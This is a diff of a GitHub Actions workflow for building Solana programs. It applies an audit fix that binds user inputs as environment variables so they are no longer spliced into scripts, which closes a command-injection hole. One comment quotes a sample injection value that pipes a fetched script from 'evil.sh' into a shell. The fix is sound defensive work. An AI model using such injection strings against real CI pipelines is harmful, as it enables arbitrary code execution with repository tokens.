@@ -75,19 +75,33 @@ jobs:
 
       - name: Validate the identities BEFORE building
         if: inputs.program == 'tegridy-launch'
+        # AUDIT FIX TF-038: BOUND AS ENV VARS, NEVER SPLICED — the rule this
+        # file's own "Build" step states, and which these steps did not follow.
+        # `${{ }}` is substituted into the script TEXT before bash parses it, so
+        # a `program_id` of `"; curl evil.sh | sh; #` became a command, not a
+        # value. Note the bitter irony of the pre-fix code: the injection
+        # happened during substitution, so THIS step — the one whose whole job
+        # is to reject a malformed pubkey — executed the payload before its own
+        # regex ever ran. Validation downstream of interpolation validates
+        # nothing. `workflow_dispatch` needs repo write, so the blast radius is
+        # a collaborator rather than the public, but write access is not
+        # permission to run arbitrary code in a job holding the workflow token.
+        env:
+          PROGRAM_ID: ${{ inputs.program_id }}
+          DEPLOYER: ${{ inputs.deployer }}
         run: |
           set -euo pipefail
           # A malformed pubkey here produces a binary pinned to an address nobody
           # controls — and that only surfaces at deploy time, after the artifact
           # looks fine. Reject up front. base58, 32 bytes, no ambiguous characters.
-          for pair in "program_id:${{ inputs.program_id }}" "deployer:${{ inputs.deployer }}"; do
-            name="${pair%%:*}"; val="${pair#*:}"
+          for name in PROGRAM_ID DEPLOYER; do
+            val="${!name}"
             if ! printf '%s' "$val" | grep -qE '^[1-9A-HJ-NP-Za-km-z]{32,44}$'; then
-              echo "::error::$name is not a plausible base58 pubkey: $val"
+              echo "::error::$name is not a plausible base58 pubkey"
               exit 1
             fi
           done
-          python3 - "${{ inputs.program_id }}" "${{ inputs.deployer }}" <<'PY'
+          python3 - "$PROGRAM_ID" "$DEPLOYER" <<'PY'
           import sys
           A = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
           for label, v in (("program_id", sys.argv[1]), ("deployer", sys.argv[2])):
@@ -110,9 +124,14 @@ jobs:
       # would build something the guard never saw.
       - name: Pin the operator's identities into the source
         if: inputs.program == 'tegridy-launch'
+        # AUDIT FIX TF-038: env, not `${{ }}` splicing. See the validate step.
+        env:
+          PROGRAM_ID: ${{ inputs.program_id }}
+          DEPLOYER: ${{ inputs.deployer }}
+          CLUSTER: ${{ inputs.cluster }}
         run: |
           set -euo pipefail
-          python3 - src/lib.rs "${{ inputs.program_id }}" "${{ inputs.deployer }}" "${{ inputs.cluster }}" <<'PY'
+          python3 - src/lib.rs "$PROGRAM_ID" "$DEPLOYER" "$CLUSTER" <<'PY'
           import re, sys
           path, program_id, deployer, cluster = sys.argv[1:5]
           src = open(path).read()
@@ -138,7 +157,10 @@ jobs:
           print(f"  patched deployer arm[{idx}] -> {deployer}  (cluster={cluster})")
           PY
           # Anchor.toml must agree or `anchor build` rewrites the id back.
-          sed -i "s/^tegridy_launch = \".*\"/tegridy_launch = \"${{ inputs.program_id }}\"/" ../../Anchor.toml || true
+          # AUDIT FIX TF-038: "$PROGRAM_ID" from env, never a spliced expression.
+          # It has already passed the base58 gate above, so it carries no `/`
+          # that could close sed's s/// or start a second command.
+          sed -i "s/^tegridy_launch = \".*\"/tegridy_launch = \"$PROGRAM_ID\"/" ../../Anchor.toml || true
 
       - name: Build
         # Inputs come through `env:`, never `${{ }}` inside the script: `${{ }}`
@@ -180,6 +202,11 @@ jobs:
           ls -l "$SO"
 
       - name: Report what a deployer must check
+        # AUDIT FIX TF-038: env is per-step, so this step needs its own binding
+        # for the two free-form inputs it prints.
+        env:
+          PROGRAM_ID: ${{ inputs.program_id }}
+          DEPLOYER: ${{ inputs.deployer }}
         run: |
           set -euo pipefail
           SO=../../target/deploy/${{ inputs.program == 'cp-swap' && 'raydium_cp_swap' || 'tegridy_launch' }}.so
@@ -189,8 +216,10 @@ jobs:
           echo "|---|---|" >> $GITHUB_STEP_SUMMARY
           echo "| cluster | \`${{ inputs.cluster }}\` |" >> $GITHUB_STEP_SUMMARY
           echo "| program | \`${{ inputs.program }}\` |" >> $GITHUB_STEP_SUMMARY
-          echo "| program id | \`${{ inputs.program_id || 'committed in source' }}\` |" >> $GITHUB_STEP_SUMMARY
-          echo "| deployer | \`${{ inputs.deployer }}\` |" >> $GITHUB_STEP_SUMMARY
+          # AUDIT FIX TF-038: env, not splicing — an inline expression here lands in the
+          # script text just the same, and this step runs whatever it becomes.
+          echo "| program id | \`${PROGRAM_ID:-committed in source}\` |" >> $GITHUB_STEP_SUMMARY
+          echo "| deployer | \`${DEPLOYER:-}\` |" >> $GITHUB_STEP_SUMMARY
           echo "| commit | \`${{ github.sha }}\` |" >> $GITHUB_STEP_SUMMARY
           echo "| size | $(stat -c%s "$SO") bytes |" >> $GITHUB_STEP_SUMMARY
           echo "| sha256 | \`$(sha256sum "$SO" | cut -d' ' -f1)\` |" >> $GITHUB_STEP_SUMMARY
